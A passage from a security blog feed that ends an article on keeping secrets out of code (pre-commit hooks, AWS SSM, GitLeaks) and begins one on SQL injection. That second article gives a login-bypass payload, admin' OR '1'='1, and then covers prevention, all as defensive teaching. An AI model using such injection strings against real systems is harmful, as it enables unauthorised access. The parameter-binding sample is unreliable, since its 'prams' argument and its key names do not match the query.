&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nt"&gt;hooks&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p p-Indicator"&gt;-&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;detect-secrets&lt;/span&gt;
&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nt"&gt;args&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p p-Indicator"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'--baseline'&lt;/span&gt;&lt;span class="p p-Indicator"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;'.secrets.baseline'&lt;/span&gt;&lt;span class="p p-Indicator"&gt;]&lt;/span&gt;
&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nt"&gt;exclude&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;.*/tests/.*&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then execute pre-commit install and you&amp;rsquo;re done üôÇ&lt;/p&gt;
&lt;p&gt;Yelps &lt;a href="https://github.com/Yelp/detect-secrets"&gt;&lt;strong&gt;detect-secrets&lt;/strong&gt;&lt;/a&gt; tries to find secrets in source code by finding high-entropy strings and the others look for common file formats/strings.&lt;/p&gt;
&lt;p&gt;There are &lt;a href="https://towardsdatascience.com/pre-commit-hooks-you-must-know-ff247f5feb7e"&gt;many other cool things&lt;/a&gt; you can do with pre-commit.&lt;/p&gt;
&lt;h3 id="storing-secrets-server-side-environment-variables"&gt;Storing Secrets Server-Side: Environment Variables&lt;/h3&gt;
&lt;p&gt;There are many secrets vault solutions, including the ones of the source code hosting providers:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.aws.amazon.com/systems-manager/latest/userguide/what-is-systems-manager.html"&gt;AWS SSM&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://azure.microsoft.com/de-de/services/key-vault/"&gt;Azure Key Vault&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.gitlab.com/ee/ci/variables/"&gt;GitlabCI Environment Variables&lt;/a&gt; and &lt;a href="https://docs.gitlab.com/ee/ci/secrets/"&gt;Hashi Corp Vault Server for Secrets&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/encrypted-secrets"&gt;GitHub&lt;/a&gt;: Encrypted Secrets&lt;/li&gt;
&lt;li&gt;&lt;a href="https://support.atlassian.com/bitbucket-cloud/docs/variables-and-secrets/"&gt;Bitbucket&lt;/a&gt;: Secured Variables&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="storing-secrets-server-side-vaults"&gt;Storing Secrets Server-Side: Vaults&lt;/h3&gt;
&lt;p&gt;Supplying the secrets via environment variables has two major drawbacks: (1) Every process can access them (2) Developers might want to log environment variables and thus leak secrets into the logs.&lt;/p&gt;
&lt;p&gt;Having a dedicated store for secrets and only getting the secrets once it&amp;rsquo;s necessary is one solution to this problem.&lt;/p&gt;
&lt;p&gt;AWS SSM is a very common solution. Here is how you use it with Python:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;boto3&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_ssm_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;boto3&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"ssm"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;param&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_parameter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;WithDecryption&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;param&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;"Parameter"&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s2"&gt;"Value"&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id="source-hosting-secrets-detection"&gt;Source Hosting Secrets Detection&lt;/h3&gt;
&lt;p&gt;Most source hosting services offer a possibility to check for leaked secrets. &lt;a href="https://docs.gitlab.com/ee/user/application_security/secret_detection/"&gt;GitLab&lt;/a&gt; calls it &amp;ldquo;secret detection&amp;rdquo;, &lt;a href="https://docs.github.com/en/free-pro-team@latest/github/administering-a-repository/about-secret-scanning"&gt;GitHub&lt;/a&gt; calls it &amp;ldquo;secret scanning&amp;rdquo; and &lt;a href="https://www.gitguardian.com/"&gt;GitGuardian&lt;/a&gt; offers secret detection &amp;amp; remediation.&lt;/p&gt;
&lt;p&gt;One can integrate Yelps &lt;a href="https://github.com/Yelp/detect-secrets"&gt;secret-detection&lt;/a&gt; into the CI pipeline. For Python, the SAST tool bandit can also be integrated into the CI pipeline. It offers &lt;a href="https://bandit.readthedocs.io/en/latest/plugins/b105_hardcoded_password_string.html"&gt;basic secret detection&lt;/a&gt;. Just remember: If the CI pipeline fails because of a found secret, you have to change that secret.&lt;/p&gt;
&lt;h2 id="testing-the-past_1"&gt;Testing the Past&lt;/h2&gt;
&lt;p&gt;Making sure that new commits are safe is good, but you also need to know if there was an incident in the past, before the security improvements were introduced. There are two tools to help you:&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/zricethezav/gitleaks"&gt;&lt;strong&gt;GitLeaks&lt;/strong&gt;&lt;/a&gt; scans your whole repository for leaked secrets. This includes credentials that were committed and removed but are still in the commit history.&lt;/p&gt;
&lt;p&gt;Here is how you install it on Linux:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# You can also go to&lt;/span&gt;
&lt;span class="c1"&gt;# [https://github.com/zricethezav/gitleaks/releases](https://github.com/zricethezav/gitleaks/releases)&lt;/span&gt;
&lt;span class="c1"&gt;# and download the version you need in the browser&lt;/span&gt;
$&lt;span class="w"&gt; &lt;/span&gt;wget&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;https://github.com/zricethezav/gitleaks/releases/download/v6.1.2/gitleaks-linux-amd64&lt;span class="o"&gt;](&lt;/span&gt;https://github.com/zricethezav/gitleaks/releases/download/v6.1.2/gitleaks-linux-amd64&lt;span class="o"&gt;)&lt;/span&gt;

$&lt;span class="w"&gt; &lt;/span&gt;mv&lt;span class="w"&gt; &lt;/span&gt;gitleaks-linux-amd64&lt;span class="w"&gt; &lt;/span&gt;gitleaks
$&lt;span class="w"&gt; &lt;/span&gt;chmod&lt;span class="w"&gt; &lt;/span&gt;+x&lt;span class="w"&gt; &lt;/span&gt;gitleaks
$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;mv&lt;span class="w"&gt; &lt;/span&gt;gitleaks&lt;span class="w"&gt; &lt;/span&gt;/usr/local/bin/

$&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;your-repo
$&lt;span class="w"&gt; &lt;/span&gt;gitleaks&lt;span class="w"&gt; &lt;/span&gt;--repo&lt;span class="o"&gt;=&lt;/span&gt;.&lt;span class="w"&gt; &lt;/span&gt;-v
INFO&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2020&lt;/span&gt;-10-13T17:38:49+02:00&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;cloning...&lt;span class="w"&gt; &lt;/span&gt;.
Enumerating&lt;span class="w"&gt; &lt;/span&gt;objects:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;115&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;.
Counting&lt;span class="w"&gt; &lt;/span&gt;objects:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;100&lt;/span&gt;%&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;115&lt;/span&gt;/115&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;.
Compressing&lt;span class="w"&gt; &lt;/span&gt;objects:&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;100&lt;/span&gt;%&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;42&lt;/span&gt;/42&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;.
Total&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;115&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;delta&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;68&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;,&lt;span class="w"&gt; &lt;/span&gt;reused&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;115&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;delta&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;68&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
INFO&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2020&lt;/span&gt;-10-13T17:38:49+02:00&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;No&lt;span class="w"&gt; &lt;/span&gt;leaks&lt;span class="w"&gt; &lt;/span&gt;detected.&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;29&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;commits&lt;span class="w"&gt; &lt;/span&gt;scanned&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;111&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;milliseconds&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;984&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;microseconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href="https://github.com/streaak/keyhacks#AWS-Access-Key-ID-and-Secret"&gt;&lt;strong&gt;Keyhacks&lt;/strong&gt;&lt;/a&gt; is a project which shows you if leaked keys are still valid and what an attacker could do with them.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://haveibeenpwned.com/"&gt;&lt;strong&gt;HaveIbeenPwned&lt;/strong&gt;&lt;/a&gt; is interesting for your private accounts. You can register and will receive an email if your email appears in a data leak. It happens so often üò± For this reason: &lt;strong&gt;Don&amp;rsquo;t re-use passwords! A re-used password is a leaked password!&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id="a-note-about-environment-variables"&gt;A note about environment Variables&lt;/h2&gt;
&lt;p&gt;Environment variables are by far not bullet-proof. Several malicious 3rd-party
packages simply send the hostname with environment variables to a server (&lt;a href="https://github.com/rsc-dev/pypi_malware#malware-packages"&gt;source&lt;/a&gt;).&lt;/p&gt;
&lt;h2 id="whats-next"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers üòà and also techniques of the defenders üòá:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) üòá&lt;/li&gt;
&lt;li&gt;Part 9: &lt;a href="https://medium.com/faun/xxe-attacks-750e91448e8f"&gt;XXE attacks&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 10: &lt;a href="https://levelup.gitconnected.com/effective-access-control-331f883cb0ff"&gt;Effective Access Control&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 11: &lt;a href="https://medium.com/bugbountywriteup/dos-via-a-billion-laughs-9a79be96e139"&gt;DOS via a Billion Laughs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 12: &lt;a href="https://medium.com/faun/full-disk-encryption-2090489f9760"&gt;Full Disk Encryption&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 13: &lt;a href="https://medium.com/bugbountywriteup/insecure-deserialization-5c64e9943f0e"&gt;Insecure Deserialization&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 14: &lt;a href="https://levelup.gitconnected.com/docker-security-5f4df118948c"&gt;Docker Security&lt;/a&gt; üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And this is about to come:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CSRF üòà&lt;/li&gt;
&lt;li&gt;DOS üòà&lt;/li&gt;
&lt;li&gt;ReDoS üòà&lt;/li&gt;
&lt;li&gt;Credential Stuffing üòà&lt;/li&gt;
&lt;li&gt;Cryptojacking üòà&lt;/li&gt;
&lt;li&gt;Single-Sign-On üòá&lt;/li&gt;
&lt;li&gt;Two-Factor Authentication üòá&lt;/li&gt;
&lt;li&gt;Backups üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="InfoSec"></category><category term="AppSec"></category><category term="Security"></category><category term="Cybersecurity"></category></entry><entry><title>SQL Injections üòà</title><link href="https://martin-thoma.com/https://medium.com/faun/sql-injections-e8bc9a14c95" rel="alternate"></link><published>2020-10-12T20:00:00+02:00</published><updated>2020-10-12T20:00:00+02:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-10-12:/https://medium.com/faun/sql-injections-e8bc9a14c95</id><summary type="html">&lt;p&gt;An SQL injection is an attack on a web system with a database. The attack is done by injecting unexpected commands into parameters. Don&amp;rsquo;t worry, I&amp;rsquo;ll explain that later in detail.&lt;/p&gt;
&lt;p&gt;After reading this article you will understand what the effect of being vulnerable to SQL injections can ‚Ä¶&lt;/p&gt;</summary><content type="html">&lt;p&gt;An SQL injection is an attack on a web system with a database. The attack is done by injecting unexpected commands into parameters. Don&amp;rsquo;t worry, I&amp;rsquo;ll explain that later in detail.&lt;/p&gt;
&lt;p&gt;After reading this article you will understand what the effect of being vulnerable to SQL injections can be, how to execute SQL injections yourself, and how to prevent them. Let&amp;rsquo;s get started!&lt;/p&gt;
&lt;h2 id="why-it-matters"&gt;Why it Matters&lt;/h2&gt;
&lt;p&gt;SQL Injection attacks are so common nowadays that I just give you this list with some of the biggest known attacks. Please note that SQL injections don&amp;rsquo;t necessarily break anything and thus they might not always be noticed. Most of the time, the attacker steals data.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Injection flaws are part of the &lt;a href="https://owasp.org/www-project-top-ten/"&gt;OWASP Top-10&lt;/a&gt;, meaning it's recognized as a common vulnerability&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;1998&lt;/strong&gt;: Jeff Forristal explains the issue (&lt;a href="https://www.esecurityplanet.com/network-security/how-was-sql-injection-discovered.html"&gt;source&lt;/a&gt;, &lt;a href="http://phrack.org/issues/54/8.html#article"&gt;original&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2009&lt;/strong&gt;: 130 million credit card numbers were stolen from Heartland Payment Systems, 7-Eleven, and others (&lt;a href="http://news.bbc.co.uk/2/hi/americas/8206305.stm"&gt;source&lt;/a&gt;). They claimed &lt;strong&gt;$130 million&lt;/strong&gt; in losses (&lt;a href="https://www.wired.com/2010/03/heartland-sentencing/"&gt;source&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2010&lt;/strong&gt;: 110,000 credit card numbers were stolen from Twin America LLC (&lt;a href="https://www.bankinfosecurity.co.uk/sql-injection-blamed-for-new-breach-a-3195"&gt;source&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2011&lt;/strong&gt;: 50,000 emails and passwords were stolen from Sony (&lt;a href="https://www.wired.com/2011/06/lulzsec-sony-again/"&gt;source&lt;/a&gt;). Sony claims that this created costs of $605,000 USD (&lt;a href="https://www.bbc.com/news/technology-19949624"&gt;source&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2015&lt;/strong&gt;: The personal data of 157,000 people was stolen from TalkTalk (&lt;a href="https://www.theregister.com/2015/11/06/talktalk_claims_157000_customers_data_stolen/"&gt;source&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2016&lt;/strong&gt;: The data of 200,000 voters in Illinois were stolen (&lt;a href="https://www.theregister.com/2016/08/29/fbi_warns_attacks_on_election_systems/"&gt;source&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2020&lt;/strong&gt;: 8.3 million user names and password hashes were stolen from FreePik (&lt;a href="https://www.zdnet.com/article/free-photos-graphics-site-freepik-discloses-data-breach-impacting-8-3m-users/"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In the worst case, the attacker steals the data and sells it. After that, they corrupt your data in a way that you don&amp;rsquo;t fix it / use the backups.&lt;/p&gt;
&lt;h2 id="how-are-sql-injection-attacks-executed"&gt;How are SQL injection attacks executed?&lt;/h2&gt;
&lt;p&gt;Imagine you have a website with a login form. Leaving some important bells and whistles away, something like this happens:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;
&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;USER&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'**[username]**'&lt;/span&gt;
&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="k"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'**[password]**'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The attacker can change the username to admin' OR '1'='1 which then gives the query:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;
&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;USER&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'**admin'&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;OR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'1'&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'1**'&lt;/span&gt;
&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="k"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;'secret'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This means the query will look for two conditions:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The username is equal to admin&lt;/li&gt;
&lt;li&gt;OR the password is equal to secret&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Instead, it should have been looking for the combination (username is admin AND the password is equal to secret).&lt;/p&gt;
&lt;p&gt;What happened here is that the attacker injected SQL into the query. This changed the logic of access control and thus let the attacker login as admin.&lt;/p&gt;
&lt;h2 id="how-can-i-prevent-sql-injections"&gt;How can I prevent SQL injections?&lt;/h2&gt;
&lt;p&gt;Input validation and proper escaping are the keys to prevent SQL injections. Preventing SQL injections in this case also helps the poor users who actually wanted to have a ' within their username/password. Never blindly trust user input. Don&amp;rsquo;t use simple string concatenation to build SQL queries with parameters supplied by the user.&lt;/p&gt;
&lt;p&gt;You might be tempted to think that removing the quotes is enough. This, however, might cause problems within your application. Then you could escape the quotes. This is certainly a good step, but you have to watch out that the escaping isn&amp;rsquo;t broken and that you don&amp;rsquo;t forget anything.&lt;/p&gt;
&lt;p&gt;Instead of doing this manually, you should use &lt;a href="https://docs.sqlalchemy.org/en/13/core/tutorial.html#bind-parameter-objects"&gt;parameter binding&lt;/a&gt;. In Python, it looks like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;sqlalchemy.sql&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;

&lt;span class="c1"&gt;# Create a connection conn&lt;/span&gt;
&lt;span class="n"&gt;stmt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="sd"&gt;"""SELECT * FROM users&lt;/span&gt;
&lt;span class="sd"&gt;               WHERE user = :username AND password = :password"""&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stmt&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;prams&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;"user"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"foo"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;"password"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;"bar"&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Another way to prevent SQL injections is to use an ORM which does the input sanitation for you:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;sqlalchemy&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;create_engine&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;sqlalchemy.ext.declarative&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;declarative_base&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;sqlalchemy.orm&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;sessionmaker&lt;/span&gt;

&lt;span class="n"&gt;Base&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;declarative_base&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;User&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Base&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;__tablename__&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"users"&lt;/span&gt;
    &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;primary_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="n"&gt;engine&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;create_engine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"sqlite://"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;Base&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;metadata&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_all&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;engine&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

